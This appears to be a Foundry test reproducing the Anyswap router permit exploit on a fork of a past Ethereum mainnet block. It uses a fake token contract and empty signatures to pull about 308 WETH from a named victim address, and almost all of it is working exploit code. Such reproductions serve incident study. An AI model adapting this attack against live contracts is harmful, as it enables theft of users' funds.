// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import {IWETH} from "src/interfaces/IWETH.sol";

interface AnyswapV4Router {
    function anySwapOutUnderlyingWithPermit(
        address from,
        address token,
        address to,
        uint256 amount,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s,
        uint256 toChainID
    ) external;
}

interface AnyswapV1ERC20 {
    function mint(address to, uint256 amount) external returns (bool);

    function burn(address from, uint256 amount) external returns (bool);

    function changeVault(address newVault) external returns (bool);

    function depositVault(
        uint256 amount,
        address to
    ) external returns (uint256);

    function withdrawVault(
        address from,
        uint256 amount,
        address to
    ) external returns (uint256);

    function underlying() external view returns (address);
}
contract ContractTest is Test {
    address WETH_Address = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    AnyswapV4Router any =
        AnyswapV4Router(0x6b7a87899490EcE95443e979cA9485CBE7E71522);
    AnyswapV1ERC20 any20 =
        AnyswapV1ERC20(0x6b7a87899490EcE95443e979cA9485CBE7E71522);
    IWETH weth = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    function setUp() public {
        vm.createSelectFork("mainnet", 14_037_236); // fork mainnet block number 14037236
    }

    function testExample() public {
        //https://etherscan.io/tx/0xe50ed602bd916fc304d53c4fed236698b71691a95774ff0aeeb74b699c6227f7
        //    anySwapOutUnderlyingWithPermit(
        //     address from,
        //     address token,
        //     address to,
        //     uint amount,
        //     uint deadline,
        //     uint8 v,
        //     bytes32 r,
        //     bytes32 s,
        //     uint toChainID
        //   )
        any.anySwapOutUnderlyingWithPermit(
            0x3Ee505bA316879d246a8fD2b3d7eE63b51B44FAB,
            address(this),
            msg.sender,
            308_636_644_758_370_382_903,
            100_000_000_000_000_000_000,
            0,
            "0x",
            "0x",
            56
        );
        emit log_named_uint(
            "Before exploit, WETH balance of attacker:",
            weth.balanceOf(msg.sender)
        );
        weth.transfer(msg.sender, 308_636_644_758_370_382_901);
        //uint sender = weth.balanceOf(msg.sender);
        emit log_named_uint(
            "After exploit, WETH balance of attacker:",
            weth.balanceOf(msg.sender)
        );
    }

    function burn(address from, uint256 amount) external pure returns (bool) {
        amount;
        from;
        return true;
    }

    function depositVault(
        uint256 amount,
        address to
    ) external pure returns (uint256) {
        amount;
        to;
        return 1;
    }

    function underlying() external view returns (address) {
        return WETH_Address;
    }
}
